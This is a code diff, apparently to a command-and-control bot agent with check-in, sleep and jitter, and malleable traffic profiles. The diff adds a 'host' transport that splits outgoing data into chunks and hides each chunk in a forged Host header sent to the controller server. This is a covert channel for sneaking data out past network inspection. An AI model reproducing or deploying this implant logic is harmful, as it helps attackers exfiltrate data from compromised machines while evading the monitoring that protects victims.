@@ -8,7 +8,9 @@ from pathlib import Path
 from uuid import UUID
 import psutil
 import requests
-from profiles import PROFILES, validate_profile
+from profiles import PROFILES, validate_profile, split_host_parts, HOST_SUFFIX
+import secrets
+
 
 SERVER_URL = os.environ.get("BOT_SERVER", "http://127.0.0.1:5000")
 PROFILE_NAME = os.environ.get("BOT_PROFILE", "standard")
@@ -16,24 +18,34 @@ SLEEP = float(os.environ.get("BOT_SLEEP", "5"))
 JITTER = float(os.environ.get("BOT_JITTER", "0.3"))
 
 
-def build_request(endpoint, profile, data):
+def build_request(endpoint, profile, data, part_host=None):
     method = profile["method"].upper()
     transport = profile["transport"]
     field = profile["field"]
     if method not in ("GET", "POST"):
         raise ValueError("Профиль поддерживает только GET и POST")
-    if transport not in ("json", "form", "query"):
+    if transport not in ("json", "form", "query", "host"):
         raise ValueError("Неизвестный transport")
     if not isinstance(field, str) or not field.strip():
         raise ValueError("Нужно непустое имя поля")
-    if method == "GET" and transport != "query":
-        raise ValueError("Для GET используй query")
+    if method == "GET" and transport not in ("query", "host"):
+        raise ValueError("Для GET используй query или host")
     if transport != "json" and isinstance(data, (dict, list)):
         data = json.dumps(data, ensure_ascii=False)
+    url = f"{SERVER_URL.rstrip('/')}/{endpoint.lstrip('/')}"
+    if transport == "host":
+        if part_host is None:
+            raise ValueError("Для host нужна часть")
+        return {
+            "method": method,
+            "url": url,
+            "headers": {"Host": part_host},
+            "timeout": 5,
+        }
     argument = {"json": "json", "form": "data", "query": "params"}[transport]
     return {
         "method": method,
-        "url": f"{SERVER_URL.rstrip('/')}/{endpoint.lstrip('/')}",
+        "url": url,
         argument: {field: data},
         "timeout": 5,
     }
@@ -47,7 +59,7 @@ def next_sleep(sleep=SLEEP, jitter=JITTER):
 
 def load_config():
     if PROFILE_NAME not in PROFILES:
-        raise ValueError("BOT_PROFILE должен быть standard или mixed")
+        raise ValueError("BOT_PROFILE должен быть standard, mixed или host")
     path = Path(os.environ.get("BOT_CONFIG", str(
         Path(__file__).with_name(f"payload-{PROFILE_NAME}.json"))))
     if path.exists():
@@ -72,12 +84,33 @@ def load_config():
 
 def profile_request(endpoint, operation, data, config):
     rule = config["profile"][operation]
-    options = build_request(endpoint, rule, data)
-    options["headers"] = {"X-Payload-UUID": config["payload_uuid"]}
-    print(rule["method"], endpoint, rule["transport"], rule["field"], flush=True)
-    response = requests.request(**options)
-    response.raise_for_status()
-    return response.json()
+    headers_base = {"X-Payload-UUID": config["payload_uuid"]}
+    if rule["transport"] != "host":
+        options = build_request(endpoint, rule, data)
+        options["headers"] = {**options.get("headers", {}), **headers_base}
+        print(rule["method"], endpoint, rule["transport"], rule["field"], flush=True)
+        response = requests.request(**options)
+        response.raise_for_status()
+        return response.json()
+
+    if isinstance(data, (dict, list)):
+        text = json.dumps(data, ensure_ascii=False)
+    else:
+        text = str(data)
+    parts = split_host_parts(text)
+    message_id = secrets.token_hex(6)
+    print(rule["method"], endpoint, "host", f"{len(parts)} частей", flush=True)
+    result = None
+    for number, part in enumerate(parts, 1):
+        host = f"m.{message_id}.{number}.{len(parts)}.{part}.{HOST_SUFFIX}"
+        options = build_request(endpoint, rule, data, part_host=host)
+        options["headers"] = {**options.get("headers", {}), **headers_base}
+        response = requests.request(**options)
+        response.raise_for_status()
+        result = response.json()
+        if number < len(parts) and "received" not in result:
+            raise ValueError("Сервер не принял промежуточную часть")
+    return result
 
 
 def checkin(config):
